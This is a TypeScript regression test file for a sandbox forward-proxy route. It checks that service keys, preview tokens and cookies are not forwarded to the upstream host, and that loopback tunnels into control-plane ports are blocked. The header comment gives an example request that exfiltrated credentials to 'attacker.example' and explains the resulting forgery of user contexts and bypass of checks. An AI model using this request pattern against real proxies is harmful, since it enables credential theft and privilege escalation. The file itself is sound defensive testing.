/**
 * `/web-proxy` must not hand our credentials to the host the caller names.
 *
 * This is a FORWARD proxy: the caller picks the upstream. It copied every
 * inbound header except six hop-by-hop ones, and apps/api authenticates each
 * request it relays here — an ordinary user's included — with the sandbox's own
 * service key, plus a signed user-context and the provider's preview token
 * (buildSandboxUpstreamHeaders, apps/api/src/sandbox-proxy/backend.ts). So
 *
 *     GET /v1/p/<id>/8000/web-proxy/https/attacker.example/collect
 *
 * mailed all three to `attacker.example`. The service key is the worst of them:
 * it is also the HMAC secret for X-Kortix-User-Context, so holding it means
 * being able to mint a context claiming any userId and any role on that box.
 *
 * The sibling port proxy already stripped `authorization` — for the upstream
 * that only ever reaches localhost. The one that reaches the open internet did
 * not. These tests exist so that asymmetry cannot come back.
 *
 * They drive the real router against a real local upstream and assert on what
 * that upstream RECEIVED, rather than on the source of the header list — a
 * source-shaped assertion here would pass just as happily if the strip set were
 * wired to the wrong call.
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test'

import { createWebProxyRouter } from '../routes/web-proxy'

const SERVICE_KEY = 'sandbox-service-key-under-test'

let upstream: ReturnType<typeof Bun.serve>
let upstreamPort: number
/** Headers the attacker-controlled upstream actually saw. */
let received: Headers | null = null

/** Read through a call so TS does not narrow `received` to the `null` it was
 *  last assigned — the mutation happens inside the server callback. */
function lastHeaders(): Headers | null {
  return received
}

beforeAll(() => {
  upstream = Bun.serve({
    port: 0,
    fetch(req) {
      received = new Headers(req.headers)
      return new Response('ok', { headers: { 'content-type': 'text/plain' } })
    },
  })
  // `port` is optional on the Bun.serve type but always set for a TCP listener.
  upstreamPort = upstream.port as number
})

afterAll(() => {
  upstream.stop(true)
})

/** The header set apps/api puts on every request it relays to the daemon. */
function proxiedUserRequestHeaders(): Record<string, string> {
  return {
    Authorization: `Bearer ${SERVICE_KEY}`,
    'X-Kortix-User-Context': 'signed.payload',
    'X-Daytona-Preview-Token': 'daytona-preview-secret',
    'e2b-traffic-access-token': 'e2b-secret',
    Cookie: '__preview_session=secret',
    'X-Kortix-Service-Call': '1',
    'User-Agent': 'kortix-test',
  }
}

function router() {
  // Nothing blocked, so the request reaches the upstream and we can inspect
  // exactly what it received.
  return createWebProxyRouter({ blockedLoopbackPorts: new Set<number>() })
}

describe('/web-proxy does not forward our credentials to the target', () => {
  test('the upstream receives none of them', async () => {
    received = null
    const res = await router().request(
      `/web-proxy/http/127.0.0.1:${upstreamPort}/collect`,
      { method: 'GET', headers: proxiedUserRequestHeaders() },
    )
    expect(res.status).toBe(200)
    expect(lastHeaders()).not.toBeNull()

    const leaked = [
      'authorization',
      'x-kortix-user-context',
      'x-daytona-preview-token',
      'e2b-traffic-access-token',
      'cookie',
      'x-kortix-service-call',
    ].filter((name) => lastHeaders()?.get(name) != null)

    expect(leaked).toEqual([])
  })

  test('the service key does not appear anywhere in the upstream request', async () => {
    // Not just under the header we expect — a rename or a copy into another
    // header would still be an exfiltration.
    received = null
    await router().request(`/web-proxy/http/127.0.0.1:${upstreamPort}/collect`, {
      method: 'GET',
      headers: proxiedUserRequestHeaders(),
    })
    const all = [...(lastHeaders()?.entries() ?? [])].map(([k, v]) => `${k}: ${v}`).join('\n')
    expect(all).not.toContain(SERVICE_KEY)
    expect(all).not.toContain('daytona-preview-secret')
  })

  test('ordinary headers still reach the upstream', async () => {
    // The strip must be surgical: this is a browser proxy, and dropping the
    // request's real headers would break the feature it exists for.
    received = null
    await router().request(`/web-proxy/http/127.0.0.1:${upstreamPort}/collect`, {
      method: 'GET',
      headers: { ...proxiedUserRequestHeaders(), 'Accept-Language': 'en-GB' },
    })
    expect(lastHeaders()?.get('accept-language')).toBe('en-GB')
    expect(lastHeaders()?.get('user-agent')).toBe('kortix-test')
  })
})

describe('/web-proxy stays off the box control plane', () => {
  const DAEMON = 8000
  const OPENCODE = 4096

  function guarded() {
    return createWebProxyRouter({ blockedLoopbackPorts: new Set([DAEMON, OPENCODE]) })
  }

  test('it refuses a loopback tunnel into opencode', async () => {
    // The bypass this closes: apps/api enforces the agent-authorization check,
    // the connector gate, the run cap, prompt idempotency and the secret-grant
    // re-mint by PATH, on the way in. Tunnelled through here the path is buried
    // in ours, so every one of them is skipped.
    const res = await guarded().request(
      `/web-proxy/http/localhost:${OPENCODE}/session/abc/prompt_async`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' },
    )
    expect(res.status).toBe(403)
    expect(await res.json()).toMatchObject({ code: 'WEB_PROXY_PORT_BLOCKED' })
  })

  test('it refuses a loopback tunnel into the daemon itself', async () => {
    const res = await guarded().request(
      `/web-proxy/http/localhost:${DAEMON}/kortix/git/commit-push`,
      { method: 'POST' },
    )
    expect(res.status).toBe(403)
  })

  test('127.0.0.1 and 0.0.0.0 are the same host as localhost', async () => {
    for (const host of ['127.0.0.1', '127.0.0.2', '0.0.0.0']) {
      const res = await guarded().request(`/web-proxy/http/${host}:${OPENCODE}/session/x`, {
        method: 'POST',
      })
      expect(res.status).toBe(403)
    }
  })

  test("browsing the agent's own dev server still works", async () => {
    // The whole point of this proxy. Blocking all of loopback would have been a
    // cheaper fix and would have broken the internal browser.
    const res = await guarded().request(
      `/web-proxy/http/localhost:${upstreamPort}/index.html`,
      { method: 'GET' },
    )
    expect(res.status).toBe(200)
  })

  test('an external host on a blocked port number is unaffected', async () => {
    // The guard keys on loopback + port, not the port alone — example.com:8000
    // is somebody else's server, not our control plane.
    const res = await guarded().request('/web-proxy/https/example.invalid:8000/', {
      method: 'GET',
    })
    expect(res.status).not.toBe(403)
  })
})
